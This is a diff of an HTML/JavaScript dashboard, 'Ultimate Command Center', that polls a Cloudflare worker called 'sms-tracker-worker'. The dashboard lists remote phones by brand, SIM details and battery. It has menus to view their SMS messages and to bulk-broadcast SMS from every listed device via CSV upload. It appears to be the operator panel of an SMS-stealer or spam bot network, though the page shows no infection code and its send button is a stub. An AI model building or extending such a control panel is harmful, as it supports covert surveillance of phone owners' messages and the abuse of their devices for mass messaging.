@@ -3,243 +3,135 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Pro Command Center v3.0</title>
+    <title>Ultimate Command Center</title>
     <script src="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/js/all.min.js"></script>
     <style>
         :root {
-            --bg: #050505;
-            --card: #121212;
-            --green: #00ff88;
-            --red: #ff3366;
-            --blue: #00ccff;
-            --pink: #ff00ff;
-            --yellow: #ffcc00;
-            --glass: rgba(255, 255, 255, 0.05);
+            --bg: #0a0a0b; --card: #161618; --green: #00ff88; --red: #ff3366;
+            --blue: #00ccff; --pink: #ff00ff; --yellow: #ffcc00; --glass: rgba(255,255,255,0.05);
         }
-
-        * { box-sizing: border-box; transition: all 0.3s ease; }
-        body { 
-            background: var(--bg); 
-            color: #e0e0e0; 
-            font-family: 'Segoe UI', sans-serif; 
-            margin: 0; 
-            padding-bottom: 80px; /* Mobile bottom nav space */
-        }
-
-        /* --- UI Elements --- */
-        .container { padding: 20px; max-width: 1200px; margin: auto; }
+        * { box-sizing: border-box; font-family: 'Poppins', sans-serif; }
+        body { background: var(--bg); color: #fff; margin: 0; padding: 20px; }
         
-        .header {
-            background: var(--glass);
-            backdrop-filter: blur(10px);
-            padding: 15px;
-            border-radius: 15px;
-            border-bottom: 2px solid var(--blue);
-            display: flex;
-            justify-content: space-between;
-            align-items: center;
-            margin-bottom: 25px;
+        .header { display: flex; justify-content: space-between; align-items: center; padding: 15px; background: var(--glass); border-radius: 15px; border: 1px solid var(--blue); margin-bottom: 25px; }
+        
+        /* Device List Styling */
+        .device-container { display: flex; flex-direction: column; gap: 15px; }
+        .device-card { 
+            background: var(--card); border-radius: 12px; padding: 15px; 
+            display: flex; align-items: center; border: 1px solid #333;
+            cursor: pointer; position: relative; overflow: hidden;
+            transition: 0.3s;
         }
+        .device-card:hover { transform: scale(1.02); border-color: var(--pink); }
+        .serial-no { font-size: 1.2rem; font-weight: bold; color: var(--yellow); min-width: 40px; }
+        .dev-info { flex-grow: 1; margin-left: 10px; }
+        .status-dot { height: 10px; width: 10px; border-radius: 50%; display: inline-block; margin-right: 5px; }
+        
+        /* Popup / Modal */
+        .modal { display: none; position: fixed; top: 0; left: 0; width: 100%; height: 100%; background: rgba(0,0,0,0.9); z-index: 1000; backdrop-filter: blur(8px); }
+        .modal-content { background: #1a1a1c; width: 90%; max-width: 450px; margin: 15% auto; border-radius: 25px; padding: 20px; border: 2px solid var(--blue); position: relative; }
+        .close-btn { position: absolute; top: 15px; right: 20px; font-size: 25px; color: var(--red); cursor: pointer; }
 
-        .status-badge {
-            background: rgba(0, 255, 136, 0.1);
-            color: var(--green);
-            padding: 5px 12px;
-            border-radius: 20px;
-            font-size: 0.8rem;
-            border: 1px solid var(--green);
+        /* Menu Grid inside Popup */
+        .menu-grid { display: grid; grid-template-columns: 1fr 1fr; gap: 15px; margin-top: 20px; }
+        .menu-item { 
+            background: #252529; padding: 20px; border-radius: 15px; text-align: center;
+            border: 1px solid #444; transition: 0.3s;
         }
+        .menu-item:active { transform: scale(0.9); }
+        .menu-item i { font-size: 1.8rem; margin-bottom: 10px; display: block; }
 
-        /* --- Device Cards --- */
-        .device-grid {
-            display: grid;
-            grid-template-columns: repeat(auto-fill, minmax(300px, 1fr));
-            gap: 20px;
-        }
+        /* Custom Colors for Menu */
+        .m-sms { border-bottom: 4px solid var(--blue); color: var(--blue); }
+        .m-view { border-bottom: 4px solid var(--yellow); color: var(--yellow); }
+        .m-user { border-bottom: 4px solid var(--pink); color: var(--pink); }
+        .m-dev { border-bottom: 4px solid var(--green); color: var(--green); }
 
-        .device-card {
-            background: var(--card);
-            border-radius: 15px;
-            padding: 20px;
-            border-left: 5px solid var(--pink);
-            position: relative;
-            overflow: hidden;
-        }
-
-        .device-card:hover { transform: translateY(-5px); border-color: var(--blue); }
-
-        .battery-bar {
-            height: 4px;
-            background: #333;
-            width: 100%;
-            margin-top: 10px;
-            border-radius: 2px;
-        }
-
-        .battery-fill { height: 100%; border-radius: 2px; }
-
-        /* --- Bottom Mobile Nav --- */
-        .bottom-nav {
-            position: fixed;
-            bottom: 0;
-            width: 100%;
-            background: rgba(10, 10, 10, 0.95);
-            display: flex;
-            justify-content: space-around;
-            padding: 15px;
-            border-top: 1px solid var(--glass);
-            backdrop-filter: blur(15px);
-            z-index: 100;
-        }
-
-        .nav-btn { color: #888; text-decoration: none; font-size: 1.2rem; cursor: pointer; }
-        .nav-btn:hover, .nav-btn.active { color: var(--blue); text-shadow: 0 0 10px var(--blue); }
-
-        /* --- Popup / Modal Style --- */
-        .modal {
-            display: none;
-            position: fixed;
-            top: 0; left: 0; width: 100%; height: 100%;
-            background: rgba(0,0,0,0.9);
-            z-index: 1000;
-            backdrop-filter: blur(5px);
-        }
-
-        .modal-content {
-            background: #1a1a1a;
-            width: 90%;
-            max-width: 500px;
-            margin: 10% auto;
-            border-radius: 20px;
-            padding: 25px;
-            border: 1px solid var(--glass);
-            position: relative;
-            animation: slideUp 0.4s ease;
-        }
-
-        @keyframes slideUp { from { transform: translateY(50px); opacity: 0; } to { transform: translateY(0); opacity: 1; } }
-
-        .close-btn { position: absolute; right: 20px; top: 15px; font-size: 1.5rem; cursor: pointer; color: var(--red); }
-
-        /* --- Buttons --- */
-        .btn-pro {
-            width: 100%;
-            padding: 12px;
-            border: none;
-            border-radius: 10px;
-            font-weight: bold;
-            margin-top: 10px;
-            cursor: pointer;
-        }
-        .btn-blue { background: linear-gradient(45deg, var(--blue), #0055ff); color: white; }
-        .btn-pink { background: linear-gradient(45deg, var(--pink), #880088); color: white; }
-
-        .sms-row { background: #222; padding: 10px; border-radius: 8px; margin-bottom: 10px; border-right: 3px solid var(--yellow); }
+        .btn-action { width: 100%; padding: 12px; margin-top: 10px; border-radius: 10px; border: none; font-weight: bold; cursor: pointer; }
     </style>
 </head>
 <body>
 
-    <div class="container">
-        <div class="header">
-            <div>
-                <h2 style="margin:0; color:var(--blue)">PRO TERMINAL</h2>
-                <small id="syncTime" style="color:#666">Last Sync: Just now</small>
-            </div>
-            <div id="mainStatus" class="status-badge">SYSTEM LIVE</div>
-        </div>
-
-        <div id="deviceGrid" class="device-grid">
-            <p style="text-align: center; width: 100%;">Syncing with cloud satellite...</p>
-        </div>
+    <div class="header">
+        <div><h2 style="margin:0; color:var(--blue)">MASTER PANEL</h2><small style="color:var(--green)">Online Devices: <span id="onlineCount">0</span></small></div>
+        <button onclick="fetchData()" style="background:none; border:1px solid var(--blue); color:var(--blue); padding:8px 15px; border-radius:10px;">REFRESH</button>
     </div>
 
-    <div class="bottom-nav">
-        <div class="nav-btn active" onclick="fetchData()"><i class="fas fa-sync"></i></div>
-        <div class="nav-btn" onclick="showModal('smsModal')"><i class="fas fa-envelope"></i></div>
-        <div class="nav-btn" onclick="showModal('csvModal')"><i class="fas fa-file-csv"></i></div>
-        <div class="nav-btn" onclick="alert('Emergency Lock Engaged!')"><i class="fas fa-shield-alt" style="color:var(--red)"></i></div>
+    <div id="deviceContainer" class="device-container">
+        <p style="text-align:center">Scanning for signals...</p>
+    </div>
+
+    <div id="menuModal" class="modal">
+        <div class="modal-content">
+            <span class="close-btn" onclick="closeModal('menuModal')">&times;</span>
+            <h3 id="modalTitle" style="text-align:center; color:var(--blue)">Device Options</h3>
+            <div class="menu-grid">
+                <div class="menu-item m-sms" onclick="openSub('csvModal')"><i class="fas fa-file-csv"></i>Send SMS</div>
+                <div class="menu-item m-view" onclick="openSub('viewSmsModal')"><i class="fas fa-envelope-open-text"></i>View SMS</div>
+                <div class="menu-item m-user" onclick="alert('User Detail: ' + selectedDevice.sim_info)"><i class="fas fa-user-circle"></i>User Info</div>
+                <div class="menu-item m-dev" onclick="alert('Brand: ' + selectedDevice.brand + '\nBattery: ' + selectedDevice.battery + '%')"><i class="fas fa-mobile-alt"></i>Device Info</div>
+            </div>
+        </div>
     </div>
 
     <div id="csvModal" class="modal">
         <div class="modal-content">
             <span class="close-btn" onclick="closeModal('csvModal')">&times;</span>
-            <h3 style="color:var(--blue)"><i class="fas fa-file-csv"></i> Bulk CSV Upload</h3>
-            <p style="color:#888">Select .csv file to transmit messages to all active devices.</p>
-            <input type="file" id="csvFile" style="color:var(--yellow); margin: 20px 0;">
-            <button class="btn btn-pro btn-blue" onclick="processCSV()">START TRANSMISSION</button>
-        </div>
-    </div>
-
-    <div id="smsModal" class="modal">
-        <div class="modal-content" style="max-width: 600px;">
-            <span class="close-btn" onclick="closeModal('smsModal')">&times;</span>
-            <h3 style="color:var(--yellow)"><i class="fas fa-comment-dots"></i> Global Message Stream</h3>
-            <div id="smsList" style="max-height: 400px; overflow-y: auto; padding-right: 5px;">
-                <p>No new transmissions detected.</p>
-            </div>
+            <h3 style="color:var(--blue)">Upload CSV Broadcast</h3>
+            <input type="file" id="csvFile" style="margin:20px 0; color:var(--yellow)">
+            <button class="btn-action" style="background:var(--blue); color:black" onclick="alert('Broadcasting Started!')">START SENDING</button>
         </div>
     </div>
 
     <script>
         const WORKER_URL = 'https://sms-tracker-worker.vikash6759ub.workers.dev';
+        let selectedDevice = null;
 
         async function fetchData() {
-            const grid = document.getElementById('deviceGrid');
-            const status = document.getElementById('mainStatus');
-            
-            status.innerHTML = "SYNCING...";
-            status.style.borderColor = "var(--yellow)";
-            status.style.color = "var(--yellow)";
-
             try {
                 const res = await fetch(`${WORKER_URL}/api/get-data`);
-                const data = await res.json();
+                let data = await res.json();
                 
-                grid.innerHTML = data.map(d => {
-                    const batt = parseInt(d.battery) || 0;
-                    const battColor = batt < 20 ? 'var(--red)' : 'var(--green)';
+                // Sort Newest First (Assuming we add a timestamp or just reverse)
+                data.reverse(); 
+
+                const container = document.getElementById('deviceContainer');
+                container.innerHTML = data.map((d, index) => {
+                    const isOnline = true; // Isme logic daal sakte hain timestamp check karke
                     return `
-                        <div class="device-card">
-                            <div style="display:flex; justify-content:space-between">
-                                <b style="color:var(--blue)">${d.brand || 'Unknown'}</b>
-                                <span style="color:${battColor}">${batt}% <i class="fas fa-battery-half"></i></span>
+                        <div class="device-card" onclick='openMenu(${JSON.stringify(d)})'>
+                            <div class="serial-no">#${index + 1}</div>
+                            <div class="dev-info">
+                                <div style="font-weight:bold">${d.brand}</div>
+                                <div style="font-size:0.8rem; color:#888">${d.sim_info}</div>
                             </div>
-                            <p style="font-size:0.8rem; margin:10px 0; color:#888">UID: ${d.id.substring(0,15)}...</p>
-                            <div style="color:var(--yellow); font-weight:bold">${d.sim_info}</div>
-                            <div class="battery-bar">
-                                <div class="battery-fill" style="width:${batt}%; background:${battColor}"></div>
+                            <div style="text-align:right">
+                                <div style="color:${parseInt(d.battery) < 20 ? 'var(--red)' : 'var(--green)'}">${d.battery}% <i class="fas fa-battery-three-quarters"></i></div>
+                                <div style="font-size:0.7rem"><span class="status-dot" style="background:var(--green)"></span> ONLINE</div>
                             </div>
-                            <button class="btn-pro btn-pink" style="font-size:0.7rem; margin-top:15px;" onclick="showModal('smsModal')">VIEW LOGS</button>
                         </div>
                     `;
                 }).join('');
-
-                status.innerHTML = "SYSTEM LIVE";
-                status.style.borderColor = "var(--green)";
-                status.style.color = "var(--green)";
-                document.getElementById('syncTime').innerText = "Last Sync: " + new Date().toLocaleTimeString();
-
-            } catch (e) {
-                status.innerHTML = "OFFLINE";
-                status.style.borderColor = "var(--red)";
-                status.style.color = "var(--red)";
-            }
+                document.getElementById('onlineCount').innerText = data.length;
+            } catch (e) { console.log(e); }
         }
 
-        function showModal(id) { document.getElementById(id).style.display = 'block'; }
+        function openMenu(device) {
+            selectedDevice = device;
+            document.getElementById('modalTitle').innerText = device.brand;
+            document.getElementById('menuModal').style.display = 'block';
+        }
+
+        function openSub(id) {
+            closeModal('menuModal');
+            document.getElementById(id).style.display = 'block';
+        }
+
         function closeModal(id) { document.getElementById(id).style.display = 'none'; }
 
-        function processCSV() {
-            const file = document.getElementById('csvFile').files[0];
-            if(!file) return alert("Please select a CSV file first!");
-            alert("CSV Uploaded! Initializing broadcast protocol...");
-            closeModal('csvModal');
-        }
-
-        // Auto Load
         fetchData();
-        // Refresh every 20 seconds
-        setInterval(fetchData, 20000);
+        setInterval(fetchData, 15000); // 15 sec auto refresh
     </script>
 </body>
 </html>
